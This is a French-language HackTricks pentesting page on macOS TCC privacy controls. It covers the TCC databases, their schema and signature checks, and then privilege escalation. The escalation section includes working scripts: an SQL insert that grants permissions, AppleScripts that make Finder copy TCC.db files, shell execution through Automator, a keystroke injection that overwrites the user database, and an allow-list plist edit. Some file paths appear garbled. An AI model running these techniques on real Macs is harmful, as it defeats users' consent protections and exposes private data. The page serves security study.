# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informations de base**

**TCC (Transparency, Consent, and Control)** est un mécanisme dans macOS pour **limiter et contrôler l'accès des applications à certaines fonctionnalités**, généralement d'un point de vue de la vie privée. Cela peut inclure des choses telles que les services de localisation, les contacts, les photos, le microphone, la caméra, l'accessibilité, l'accès complet au disque et bien d'autres.

Du point de vue de l'utilisateur, il voit TCC en action **lorsqu'une application souhaite accéder à l'une des fonctionnalités protégées par TCC**. Lorsque cela se produit, **l'utilisateur est invité** avec une boîte de dialogue lui demandant s'il souhaite autoriser l'accès ou non.

Il est également possible de **donner aux applications l'accès** aux fichiers par des **intentions explicites** des utilisateurs, par exemple lorsqu'un utilisateur **glisse-dépose un fichier dans un programme** (évidemment, le programme devrait y avoir accès).

![Un exemple de demande TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** est géré par le **daemon** situé dans `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` et configuré dans `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (enregistrant le service mach `com.apple.tccd.system`).

Il existe un **tccd en mode utilisateur** fonctionnant par utilisateur connecté défini dans `/System/Library/LaunchAgents/com.apple.tccd.plist` enregistrant les services mach `com.apple.tccd` et `com.apple.usernotifications.delegate.com.apple.tccd`.

Ici, vous pouvez voir le tccd fonctionnant en tant que système et en tant qu'utilisateur :
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Les **permissions sont héritées de l'application parente** et les **permissions** sont **suivies** en fonction de l'**ID de Bundle** et de l'**ID de Développeur**.

### Bases de données TCC

Les autorisations/refus sont ensuite stockés dans certaines bases de données TCC :

* La base de données système dans **`/Library/Application Support/com.apple.TCC/TCC.db`**.
* Cette base de données est **protégée par SIP**, donc seul un contournement de SIP peut y écrire.
* La base de données TCC utilisateur **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** pour les préférences par utilisateur.
* Cette base de données est protégée de sorte que seuls les processus avec des privilèges TCC élevés comme l'Accès Complet au Disque peuvent y écrire (mais elle n'est pas protégée par SIP).

{% hint style="warning" %}
Les bases de données précédentes sont également **protégées par TCC pour l'accès en lecture**. Ainsi, vous **ne pourrez pas lire** votre base de données TCC utilisateur régulière à moins que ce ne soit à partir d'un processus privilégié TCC.

Cependant, rappelez-vous qu'un processus avec ces privilèges élevés (comme **FDA** ou **`kTCCServiceEndpointSecurityClient`**) pourra écrire dans la base de données TCC des utilisateurs
{% endhint %}

* Il existe une **troisième** base de données TCC dans **`/var/db/locationd/clients.plist`** pour indiquer les clients autorisés à **accéder aux services de localisation**.
* Le fichier protégé par SIP **`/Users/carlospolop/Downloads/REG.db`** (également protégé de l'accès en lecture par TCC), contient l'**emplacement** de toutes les **bases de données TCC valides**.
* Le fichier protégé par SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (également protégé de l'accès en lecture par TCC), contient plus de permissions accordées par TCC.
* Le fichier protégé par SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (mais lisible par tout le monde) est une liste d'autorisation d'applications qui nécessitent une exception TCC.

{% hint style="success" %}
La base de données TCC dans **iOS** se trouve dans **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
L'**interface utilisateur du centre de notifications** peut apporter des **modifications dans la base de données TCC système** :

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Cependant, les utilisateurs peuvent **supprimer ou interroger des règles** avec l'utilitaire de ligne de commande **`tccutil`**.
{% endhint %}

#### Interroger les bases de données

{% tabs %}
{% tab title="base de données utilisateur" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="base de données système" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
En vérifiant les deux bases de données, vous pouvez vérifier les permissions qu'une application a autorisées, interdites ou n'a pas (elle les demandera).
{% endhint %}

* Le **`service`** est la représentation en chaîne de la **permission** TCC
* Le **`client`** est l'**ID de bundle** ou le **chemin vers le binaire** avec les permissions
* Le **`client_type`** indique s'il s'agit d'un identifiant de bundle(0) ou d'un chemin absolu(1)

<details>

<summary>Comment exécuter si c'est un chemin absolu</summary>

Faites simplement **`launctl load your_bin.plist`**, avec un plist comme :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
<details>

* La valeur **`auth_value`** peut prendre différentes valeurs : refusée(0), inconnue(1), autorisée(2), ou limitée(3).
* La valeur **`auth_reason`** peut prendre les valeurs suivantes : Erreur(1), Consentement de l'utilisateur(2), Défini par l'utilisateur(3), Défini par le système(4), Politique de service(5), Politique MDM(6), Politique de surpassement(7), Chaîne d'utilisation manquante(8), Délai d'attente de l'invite(9), Pré-vérification inconnue(10), Autorisé(11), Politique de type d'application(12)
* Le champ **csreq** est là pour indiquer comment vérifier le binaire à exécuter et accorder les permissions TCC :
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Pour plus d'informations sur **les autres champs** du tableau, [**consultez ce billet de blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Vous pouvez également vérifier **les permissions déjà accordées** aux applications dans `Préférences Système --> Sécurité et confidentialité --> Confidentialité --> Fichiers et dossiers`.

{% hint style="success" %}
Les utilisateurs _peuvent_ **supprimer ou interroger des règles** en utilisant **`tccutil`** .&#x20;
{% endhint %}

#### Réinitialiser les permissions TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Contrôles de signature TCC

La base de données TCC stocke l'**ID de bundle** de l'application, mais elle conserve également des **informations** sur la **signature** pour **s'assurer** que l'application demandant à utiliser une permission est la bonne.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Ainsi, d'autres applications utilisant le même nom et ID de bundle ne pourront pas accéder aux permissions accordées à d'autres applications.
{% endhint %}

### Droits et Permissions TCC

Les applications **doivent non seulement** **demander** et **obtenir l'accès** à certaines ressources, mais elles doivent également **posséder les droits appropriés**.\
Par exemple, **Telegram** possède le droit `com.apple.security.device.camera` pour demander **l'accès à la caméra**. Une **application** qui **n'a pas** ce **droit ne pourra pas** accéder à la caméra (et l'utilisateur ne sera même pas sollicité pour donner les permissions).

Cependant, pour que les applications **accèdent** à **certains dossiers utilisateur**, tels que `~/Desktop`, `~/Downloads` et `~/Documents`, elles **n'ont pas besoin** d'avoir des **droits spécifiques**. Le système gérera l'accès de manière transparente et **sollicitera l'utilisateur** si nécessaire.

Les applications d'Apple **ne généreront pas de demandes**. Elles contiennent des **droits pré-accordés** dans leur liste de **droits**, ce qui signifie qu'elles ne **généreront jamais de popup**, **ni** n'apparaîtront dans aucune des bases de données **TCC**. Par exemple :
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Cela évitera à l'application Calendrier de demander à l'utilisateur d'accéder aux rappels, au calendrier et au carnet d'adresses.

{% hint style="success" %}
En plus de certaines documentations officielles sur les droits, il est également possible de trouver des **informations intéressantes non officielles sur les droits dans** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Certaines permissions TCC sont : kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Il n'existe pas de liste publique qui les définit toutes, mais vous pouvez consulter cette [**liste des connues**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Emplacements sensibles non protégés

* $HOME (lui-même)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### Intention de l'utilisateur / com.apple.macl

Comme mentionné précédemment, il est possible de **donner accès à une application à un fichier en le glissant-déposant dessus**. Cet accès ne sera pas spécifié dans aucune base de données TCC mais comme un **attribut étendu du fichier**. Cet attribut **stockera l'UUID** de l'application autorisée :
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Il est curieux que l'attribut **`com.apple.macl`** soit géré par le **Sandbox**, et non par tccd.

Notez également que si vous déplacez un fichier qui autorise l'UUID d'une application sur votre ordinateur vers un autre ordinateur, étant donné que la même application aura des UID différents, cela ne donnera pas accès à cette application.
{% endhint %}

L'attribut étendu `com.apple.macl` **ne peut pas être effacé** comme les autres attributs étendus car il est **protégé par SIP**. Cependant, comme [**expliqué dans cet article**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), il est possible de le désactiver en **compressant** le fichier, en le **supprimant** et en le **décompressant**.

## Élévation de privilèges et contournements TCC

### Insérer dans TCC

Si à un moment donné vous parvenez à obtenir un accès en écriture sur une base de données TCC, vous pouvez utiliser quelque chose comme ce qui suit pour ajouter une entrée (retirez les commentaires) :

<details>

<summary>Exemple d'insertion dans TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### Automatisation pour FDA\*

Le nom TCC de la permission d'Automatisation est : **`kTCCServiceAppleEvents`**\
Cette permission TCC spécifique indique également **l'application qui peut être gérée** dans la base de données TCC (donc les permissions ne permettent pas de tout gérer).

**Finder** est une application qui **a toujours FDA** (même si cela n'apparaît pas dans l'UI), donc si vous avez des privilèges **d'Automatisation** dessus, vous pouvez abuser de ses privilèges pour **lui faire exécuter certaines actions**.\
Dans ce cas, votre application aurait besoin de la permission **`kTCCServiceAppleEvents`** sur **`com.apple.Finder`**.

{% tabs %}
{% tab title="Vol de la TCC.db des utilisateurs" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}

{% tab title="Vol de la base de données TCC.db du système" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

Vous pourriez en abuser pour **écrire votre propre base de données TCC utilisateur**.

{% hint style="warning" %}
Avec cette permission, vous pourrez **demander à Finder d'accéder aux dossiers restreints par TCC** et de vous donner les fichiers, mais afaik vous **ne pourrez pas faire exécuter du code arbitraire par Finder** pour abuser pleinement de son accès FDA.

Par conséquent, vous ne pourrez pas abuser des pleines capacités FDA.
{% endhint %}

Voici l'invite TCC pour obtenir des privilèges d'automatisation sur Finder :

<figure><img src="../../../../.gitbook/assets/image (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Notez que parce que l'application **Automator** a la permission TCC **`kTCCServiceAppleEvents`**, elle peut **contrôler n'importe quelle application**, comme Finder. Donc, en ayant la permission de contrôler Automator, vous pourriez également contrôler le **Finder** avec un code comme celui ci-dessous :
{% endhint %}

<details>

<summary>Obtenir un shell dans Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

La même chose se produit avec **l'application Script Editor,** elle peut contrôler Finder, mais en utilisant un AppleScript, vous ne pouvez pas le forcer à exécuter un script.

### Automatisation + Accessibilité (**`kTCCServicePostEvent`)** vers FDA\*

L'automatisation sur **`System Events`** + Accessibilité (**`kTCCServicePostEvent`**) permet d'envoyer des **frappes de touches aux processus**. De cette manière, vous pourriez abuser de Finder pour modifier le TCC.db de l'utilisateur ou pour donner FDA à une application arbitraire (bien que le mot de passe puisse être demandé pour cela).

Exemple de Finder écrasant le TCC.db de l'utilisateur :
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### **Client de sécurité de point de terminaison à FDA**

Si vous avez **`kTCCServiceEndpointSecurityClient`**, vous avez FDA. Fin.

### Politique système SysAdmin File à FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permet de **changer** l'attribut **`NFSHomeDirectory`** d'un utilisateur qui change son dossier personnel et permet donc de **contourner TCC**.

### Base de données TCC utilisateur à FDA

Obtenir des **droits d'écriture** sur la base de données TCC de l'**utilisateur** ne vous permet **pas** de vous accorder les permissions **`FDA`**, seul celle qui réside dans la base de données système peut accorder cela.

Mais vous pouvez vous donner les **droits d'`Automation à Finder`**, et abuser de la technique précédente pour escalader à FDA\*.

### **FDA aux permissions TCC**

**L'accès complet au disque** est nommé dans TCC **`kTCCServiceSystemPolicyAllFiles`**

Je ne pense pas que cela soit une réelle élévation de privilèges, mais au cas où vous trouveriez cela utile : Si vous contrôlez un programme avec FDA, vous pouvez **modifier la base de données TCC de l'utilisateur et vous accorder n'importe quel accès**. Cela peut être utile comme technique de persistance au cas où vous perdriez vos permissions FDA.

### **Contournement de SIP à contournement de TCC**

La base de données TCC du système est protégée par **SIP**, c'est pourquoi seuls les processus avec les **droits indiqués vont pouvoir la modifier**. Par conséquent, si un attaquant trouve un **contournement de SIP** sur un **fichier** (être capable de modifier un fichier restreint par SIP), il pourra :

* **Retirer la protection** d'une base de données TCC, et s'accorder toutes les permissions TCC. Il pourrait abuser de n'importe lequel de ces fichiers par exemple :
* La base de données système TCC
* REG.db
* MDMOverrides.plist

Cependant, il existe une autre option pour abuser de ce **contournement de SIP pour contourner TCC**, le fichier `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` est une liste d'autorisation d'applications qui nécessitent une exception TCC. Par conséquent, si un attaquant peut **retirer la protection SIP** de ce fichier et ajouter sa **propre application**, l'application pourra contourner TCC.\
Par exemple pour ajouter le terminal :
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Contournements de TCC

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Références

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
